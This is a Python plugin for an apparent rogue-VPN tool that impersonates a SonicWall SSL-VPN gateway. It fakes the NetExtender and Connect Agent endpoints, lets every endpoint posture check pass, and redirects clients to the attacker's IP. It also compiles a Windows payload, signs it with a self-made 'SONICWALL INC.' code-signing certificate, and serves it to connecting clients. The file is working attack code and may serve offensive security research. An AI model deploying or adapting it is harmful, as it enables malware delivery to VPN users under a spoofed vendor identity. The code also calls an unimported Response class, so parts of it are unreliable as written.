from nachovpn.plugins import VPNPlugin
from flask import Flask, jsonify, request, abort, send_file, make_response
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import ExtendedKeyUsageOID

import logging
import datetime
import subprocess
import shutil
import urllib.parse
import base64
import uuid
import json
import os

class SonicWallPlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        # provide the templates directory relative to this plugin
        super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))
        self.payload_dir = os.path.join(os.getcwd(), 'payloads')
        self.files_dir = os.path.join(os.path.dirname(__file__), 'files')
        os.makedirs(self.payload_dir, exist_ok=True)
        self.setup_payload()

    def can_handle_data(self, data, client_socket, client_ip):
        # CONNECT tunnel is not currently supported
        return False

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        if 'SonicWALL NetExtender' in user_agent or \
           'SMA Connect Agent' in user_agent or \
           handler.path == '/sonicwall' or \
           handler.path == '/sonicwall/ca.crt':
            return True
        return False

    def random_swap(self):
        return base64.b64encode(base64.b64encode(os.urandom(32))).decode()

    def _setup_routes(self):
        # Call the parent class's route setup
        super()._setup_routes()

        @self.flask_app.route('/', defaults={'path': ''}, methods=['CONNECT'])
        @self.flask_app.route('/<path:path>', methods=['CONNECT'])
        def handle_connect(path):
            self.logger.info(f"handle CONNECT: {path}")
            self.logger.info(request.headers)
            self.logger.info(request.cookies)
            self.logger.info(request.data)
            self.logger.info(request.args)
            self.logger.info(request.form)
            self.logger.info(request.endpoint)
            self.logger.info(request.method)
            self.logger.info(request.remote_addr)
            return Response("Connection Established", status=200, mimetype='text/plain')

        @self.flask_app.route('/sonicwall/ca.crt')
        def cert():
            cert_path = os.path.join(os.getcwd(), 'certs', 'ca.crt')
            if not os.path.exists(cert_path):
                return abort(404)
            return send_file(cert_path)

        @self.flask_app.route('/cgi-bin/welcome')
        def welcome():
            return self.render_template('welcome.html')

        @self.flask_app.route('/cgi-bin/userLogin', methods = ['POST', 'GET'])
        def user_login():
            resp = Response('<HTML><HEAD><META HTTP-EQUIV="Pragma" CONTENT="no-cache"><meta http-equiv="refresh" content="0; URL=/cgi-bin/portal"></HEAD><BODY></BODY></HTML>')
            resp.set_cookie('swap', self.random_swap())
            return resp

        @self.flask_app.route('/cgi-bin/sslvpnclient', methods = ['POST', 'GET'])
        def ssl_vpnclient():
            if request.args.get('getepcprofiles'):
                return 'X-NE-sslvpnnac-allow: {}\r\nX-NE-sslvpnnac-deny: {}'
            elif request.args.get('launchnetextender'):
                return self.render_template('launchextender.html')
            elif request.args.get('versionquery'):
                return 'NX_WINDOWS_VER: 0x00000000;\n NX_TUNNEL_PROTO_VER: 2.0;\n NX_MAY_CHANGE_PASSWORD:0;\n NX_WIN_MIN_GOOD_VERSION: 0x0a020153;\n'
            elif request.args.get('launchplatform'):
                return self.render_template('launchplatform.html')
            elif request.args.get('epcversionquery'):
                return 'NX_WINDOWS_EPC_VER: 0xFF;'
            elif request.args.get('gettunnelfailedinfo'):
                return '<HTML><HEAD><META HTTP-EQUIV="Pragma" CONTENT="no-cache">' \
                    '<meta http-equiv="refresh" content="0; URL=/cgi-bin/welcome"></HEAD><BODY></BODY></HTML>'
            elif request.args.get('launchextrainfos'):
                return 'connProxy = 0;\nconnPacURL = ;\nconnProxyURL = ;\nconnProxyByPass = ;\n'
            elif request.form.get('setclienthostname'):
                return ''
            return abort(404)

        @self.flask_app.route('/cgi-bin/sessionStatus')
        def session_status():
            if request.form.get('touchSession'):
                return {"status":"touch ok", "nxnoneedtouchsession": "true"}
            return abort(404)

        @self.flask_app.route('/cgi-bin/getaovconf', methods = ['POST', 'GET'])
        def getaovconf():
            return {
                "result": 0,"aovTempShutDown": 0, 
                "aovAllowAlwaysOnVPN": 0, "aovAllowUserDisconnect": 0,
                "aovUserEmail": "", "aovAllowAccessWhenVPNFailToConnect": 0,
                "aovAllowNoConnectInTrustedNetwork": 0, "aovSecureHosts": "",
                "nePrimaryDns": "1.1.1.1", "neSecondaryDns": "8.8.8.8", 
                "dnsDomainSuffixes": ""
                }

        @self.flask_app.route('/cgi-bin/tunneltype', methods = ['POST', 'GET'])
        def tunnel_type():
            return {"preferVPN": "SSLVPN","allowedVPN": "NONE"}

        @self.flask_app.route('/cgi-bin/epcs', methods = ['POST', 'GET'])
        def epcs():
            return 'X-NE-epcret: pass'

        @self.flask_app.route('/cgi-bin/wxacneg')
        def wxacneg():
            return self.render_template('wxacneg.html')

        @self.flask_app.route('/cgi-bin/userLogout')
        def logout():
            return self.render_template('logout.html')

        @self.flask_app.route('/NXSetupU.exe')
        def nxsetup():
            if not os.path.exists(os.path.join(self.payload_dir, 'NXSetupU.exe')):
                return abort(404)
            return send_file(os.path.join(self.payload_dir, 'NXSetupU.exe'))

        @self.flask_app.route('/NACAgent.exe')
        def nacagent():
            if not os.path.exists(os.path.join(self.payload_dir, 'NACAgent.exe')):
                return abort(404)
            return send_file(os.path.join(self.payload_dir, 'NACAgent.exe'))

        @self.flask_app.route('/NXSetupU.exe.manifest')
        def nxsetup_manifest():
            if not os.path.exists(os.path.join(self.payload_dir, 'NXSetupU.exe.manifest')):
                return abort(404)
            return send_file(os.path.join(self.payload_dir, 'NXSetupU.exe.manifest'))

        @self.flask_app.route('/cgi-bin/extendauthentication', methods = ['POST', 'GET'])
        def extendauthentication():
            resp = make_response('{"response":"OK"}')
            resp.set_cookie('swap', self.random_swap())
            return resp

        @self.flask_app.route('/sonicwall')
        def index():
            # the sonicwallconnectagent:// URI handler must use the external IP address and NOT the DNS name
            token = {
                "action": 10, "helperversion": "1.1.42", "host": self.external_ip, 
                "port": "443", "username": "user", "extendid": base64.b64encode(os.urandom(32)).decode()
                }

            data = json.dumps(token).replace(' ', '')
            encoded = urllib.parse.quote(base64.b64encode(str(data).encode()).decode())
            url = f"sonicwallconnectagent://{encoded}"
            return f"<html><head></head><body><script>window.location.href='{url}';</script></body></html>"

    def compile_payload(self):
        source_file = os.path.join(self.files_dir, 'NACAgent.c')
        output_file = os.path.join(self.payload_dir, 'NACAgent.exe')
        if not os.path.exists(source_file) or not os.path.exists('/usr/bin/x86_64-w64-mingw32-gcc'):
            return False

        proc = subprocess.run([
            "/usr/bin/x86_64-w64-mingw32-gcc",
            "-L", "/usr/x86_64-w64-mingw32/lib",
            "-o", output_file, source_file,
            "--static", "-lwtsapi32", "-luserenv"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return proc.returncode == 0 and os.path.exists(output_file)

    def verify_payload(self):
        # Verify that the payload is signed by our current CA
        if os.name == "nt":
            self.logger.error("Windows payload verification not supported yet")
            return True

        if os.name == "posix" and not os.path.exists('/usr/bin/osslsigncode'):
            self.logger.error("osslsigncode not found, skipping verification")
            return True

        proc = subprocess.run([
            "/usr/bin/osslsigncode", "verify", "-CAfile", self.cert_manager.ca_cert_path,
            "-in", os.path.join(self.payload_dir, 'NACAgent.exe'),
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if proc.returncode:
            self.logger.error(f"Failed to verify {os.path.join(self.payload_dir, 'NACAgent.exe')}: {proc.returncode}")
            return False

        self.logger.info(f"{os.path.join(self.payload_dir, 'NACAgent.exe')} verified")
        return True

    def setup_payload(self):
        # skip on Windows for now (we can use signtool if needed)
        if os.name == 'nt':
            return True

        # If the payload already exists and is validly signed, skip compilation/signing
        if os.path.exists(os.path.join(self.payload_dir, 'NACAgent.exe')) and \
           self.verify_payload():
            self.logger.info(f"{os.path.join(self.payload_dir, 'NACAgent.exe')} already exists and is validly signed")
            return True

        # the user can provide their own sonicwall.pfx file in the certs directory
        # if not, a new signing certificate will be generated and self-signed by the CA
        cert_path = os.path.join('certs', 'sonicwall.cer')
        key_path = os.path.join('certs', 'sonicwall.key')
        pfx_path = os.path.join('certs', 'sonicwall.pfx')
        if not os.path.exists(pfx_path) or not self.cert_manager.cert_is_valid(cert_path, "SONICWALL INC."):
            pfx_path = self.cert_manager.generate_codesign_certificate(
                common_name="SONICWALL INC.",
                pfx_path=pfx_path,
                cert_path=cert_path, 
                key_path=key_path
            )

        # sign NACAgent.exe
        input_file = os.path.join(self.payload_dir, 'NACAgent.exe')
        output_file = os.path.join(self.payload_dir, 'NACAgent.exe.signed')
        if not os.path.exists(input_file):
            # attempt to compile the default payload from source
            if not self.compile_payload():
                self.logger.warning(f"Warning: {input_file} does not exist and could not be compiled. Payload will not be served.")
                return False

        proc = subprocess.run(["/usr/bin/osslsigncode", 'sign', '-pkcs12', pfx_path, '-in', input_file, '-out', output_file],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if proc.returncode or not os.path.exists(output_file):
            self.logger.warning(f"Warning: {input_file} could not be signed. Payload will not be served.")
            return False
        else:
            shutil.move(output_file, input_file)
        return True